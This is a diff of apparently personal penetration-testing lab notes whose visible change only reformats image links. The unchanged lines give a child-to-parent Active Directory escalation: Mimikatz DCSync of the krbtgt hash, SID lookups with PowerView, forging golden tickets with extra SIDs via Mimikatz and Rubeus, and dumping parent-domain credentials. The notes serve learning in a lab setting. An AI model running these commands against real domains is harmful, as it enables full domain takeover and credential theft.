@@ -22,21 +22,21 @@ to perform this attack, we need the following
 ```JavaScript
 lsadump::dcsync /user:<CHILD_DOMAIN>\krbtgt
 ```
-![[/image 359.png|image 359.png]]
+![image 359.png](/image%20359.png)
   
 ### Getting Domain SID
 With PowerView
 ```JavaScript
 Get-DomainSID
 ```
-![[/image 1 267.png|image 1 267.png]]
+![image 1 267.png](/image%201%20267.png)
   
 ### Obtaining Enterprise Admins Group’s SID using Get-DomainGroup
 With PowerView
 ```JavaScript
 Get-DomainGroup -Domain <DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
-![[/image 2 226.png|image 2 226.png]]
+![image 2 226.png](/image%202%20226.png)
   
 ### Creating a Golden Ticket with Mimikatz
 now we have all the information we need
@@ -50,10 +50,10 @@ Use mimikatz to create a golden ticket
 ```JavaScript
 kerberos::golden /user:<user> /domain:<CHILD_DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_hash> /sids:<enterprise_admins_sid> /ptt
 ```
-![[/image 3 196.png|image 3 196.png]]
+![image 3 196.png](/image%203%20196.png)
   
 confirm that the golden ticket is in memory using “klist”
-![[/image 4 172.png|image 4 172.png]]
+![image 4 172.png](/image%204%20172.png)
   
 can now list C: drive on parent domain controller
 ```JavaScript
@@ -72,11 +72,11 @@ Once you have all the info, use Rubeus to create the golden ticket
 ```JavaScript
 .\Rubeus.exe golden /rc4:<KRBTGT_hash> /domain:<CHILD_DOMAIN> /sid:<domain_sid>  /sids:<enterprise_admin_sid> /user:<user> /ptt
 ```
-![[/image 5 161.png|image 5 161.png]]
+![image 5 161.png](/image%205%20161.png)
 - also gives you the base64 ticket
   
 confirm it is cached in memory using “klist”
-![[/image 6 140.png|image 6 140.png]]
+![image 6 140.png](/image%206%20140.png)
   
 ### Perform DCSync Attack Against Parent Domain
 ```JavaScript
@@ -85,11 +85,11 @@ lsadump::dcsync /user:<DOMAIN>\<user>
 ```
 - they target just a single user, but you can also just dump the whole domain
 - for domain, they just put “INLANEFREIGHT”, not “INLANEFREIGHT.LOCAL”
-![[/image 7 131.png|image 7 131.png]]
+![image 7 131.png](/image%207%20131.png)
   
 when dealing with multiple domains and our target domain is not the one our user is from, we also have to specify the domain for DCSync
 - example
 ```JavaScript
 lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
-![[/image 8 115.png|image 8 115.png]]
+![image 8 115.png](/image%208%20115.png)
